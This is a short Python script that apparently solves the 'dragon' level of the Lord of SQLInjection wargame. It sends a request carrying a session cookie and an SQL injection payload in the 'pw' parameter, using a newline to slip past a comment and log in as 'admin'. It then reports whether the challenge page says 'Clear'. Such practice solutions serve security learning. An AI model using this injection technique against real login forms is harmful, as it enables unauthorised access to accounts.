import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/dragon_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}



res = requests.get(url, params={'pw':'\n and false or id=\'admin'},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")